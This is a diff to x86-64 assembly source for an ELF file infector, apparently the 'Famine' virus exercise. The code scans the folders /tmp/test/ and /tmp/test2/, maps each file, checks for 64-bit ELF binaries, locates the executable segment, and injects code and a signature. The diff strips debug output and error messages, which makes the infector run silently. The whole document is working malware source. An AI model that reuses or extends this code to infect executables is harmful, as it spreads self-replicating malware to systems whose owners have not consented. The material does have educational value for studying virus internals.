@@ -148,7 +148,7 @@ treate_folder:
 	xor rdx, rdx					; 0
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
-	jl .err						;	 goto .err
+	jl .end						;	 goto .end
 	mov [fd], rax					; fd = _ret;
 
 .begin_getdents_loop:					; while (true) {
@@ -170,13 +170,6 @@ treate_folder:
 	add rax, [cur_offset]				; ...
 	mov [cur_dirent], rax				; ...
 
-	; start debug (delete this)
-	mov rdi, [cur_dirent]				; char *_str = cur_dirent->d_name;
-	add rdi, linux_dirent64.d_name			; ...
-	call print_string				; print_string(_str);
-	; end debug
-
-	; TODO: detect is regular file
 	mov rdi, [folder]				; treat_file(folder;
 	mov rsi, [cur_dirent]				; 	cur_dirent
 	add rsi, linux_dirent64.d_name			; 		->d_name
@@ -198,21 +191,9 @@ treate_folder:
 .end_getdents_loop:					; }
 
 	; Close folder
-	mov rax, SYS_CLOSE				; _ret = close(
+	mov rax, SYS_CLOSE				; close(
 	mov rdi, [fd]					;	fd
 	syscall						; );
-	cmp rax, -1					; if (_ret == -1)
-	je .err						; 	goto .err
-	jmp .end					; else goto end
-
-; TODO Delete this
-.err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .end					; goto .end
 
 .end:
 	add rsp, %$localsize
@@ -271,7 +252,7 @@ treat_file:
 	xor rdx, rdx					; 0
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
-	jl .err						;	 goto .err
+	jl .end						;	 goto .err
 	mov [fd], rax					; fd = _ret;
 
 	; Get file stat
@@ -280,13 +261,13 @@ treat_file:
 	mov rdi, [fd]					; 	fd,
 	syscall						; _stat);
 	cmp rax, -1					; if (_ret == -1)
-	je .close_err					; 	goto .close_err
+	je .close_file					; 	goto .close_file
 
 	add rsi, stat.st_size				; filesize = _stat->st_size;
 	mov rax, [rsi]					; ...
 	mov [filesize], rax				; ...
 	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
-	jl .close_err					; 	goto .close_err
+	jl .close_file					; 	goto .close_file
 
 	; Map file
 	mov rax, SYS_MMAP				; _ret = mmap(
@@ -298,20 +279,20 @@ treat_file:
 	xor r9, r9					; 	0
 	syscall						; );
 	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
-	je .close_err					; 	goto .close_err
+	je .close_file					; 	goto .close_file
 	mov [mappedfile], rax				; mappedfile = _ret;
 
 	; Check if file is an ELF 64
 	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
 	call is_elf_64					; ...
 	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
-	jne .unmap_err					; 	goto .unmap_err
+	jne .unmap_file					; 	goto .unmap_file
 
 	; Find executable segment
 	mov rdi, [mappedfile]				; res = find_exec_segment(mappedfile);
 	call find_exec_segment				; ...
 	cmp rax, 0					; if (res == NULL)
-	je .unmap_err					; 	goto .unmap_err
+	je .unmap_file					; 	goto .unmap_file
 	mov [exec_segment], rax				; exec_segment = res;
 
 	; Check if file has signature
@@ -333,45 +314,15 @@ treat_file:
 	mov rsi, [exec_segment]				; ...
 	call sign					; ...
 
-	jmp .unmap_file
-
-; TODO Delete this
-.unmap_err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .unmap_file
-
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
 	mov rdi, [mappedfile]				; 	mappedfile,
 	mov rsi, [filesize]				; 	filesize
 	syscall						; );
-	jmp .close_file					; goto .close_file
-
-; TODO Delete this
-.close_err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
-	syscall						; );
-	jmp .close_file
 
 .close_file:
 	mov rax, SYS_CLOSE				; _ret = close(
 	mov rdi, [fd]					;	fd
-	syscall						; );
-	jmp .end					; goto end
-
-; TODO Delete this
-.err:
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
-	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 
 .end:
@@ -602,51 +553,15 @@ inject:
 	mov esi, [computed_jmp_value]			; *jmp_value_ptr = computed_jmp_value;
 	mov [rdi], esi					; ...
 
-	jmp .end					; goto end
-
 .end:
 	add rsp, %$localsize
 	pop rbp
 	%pop
 	ret
 
-; DEBUG
-; void print_string(char const *str);
-; void print_string(rdi str);
-print_string:
-	push rdi					; save str				
-
-	xor rdx, rdx					; _len = 0;
-	.begin_strlen_loop:				; while (true) {
-		mov sil, [rdi]				; _c = *_str;
-		cmp sil, 0				; if (_c == 0)
-		je .end_strlen_loop			; 	break;
-		inc rdx					; _len++
-		inc rdi					; _str++;
-		jmp .begin_strlen_loop			; }
-	.end_strlen_loop:				; ...
-
-	pop rsi						; load str
-
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1,
-	syscall						;	str, _len);
-
-	mov rax, SYS_WRITE				; write(
-	mov rdi, 1					; 	1, 
-	push 0x0A					; 	'\n',
-	mov rsi, rsp					; 	...
-	mov rdx, 1					; 	1
-	syscall						; );
-	add rsp, 8					; unpop '\n'
-	
-	ret
-
 section .data
 	infected_folder_1: db "/tmp/test/", 0
 	infected_folder_2: db "/tmp/test2/", 0
-	err_msg: db "Error occured !", 10
-	len_err_msg: equ $ - err_msg
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
 	signature: db "Famine v1.0 by jmaia and dhubleur"
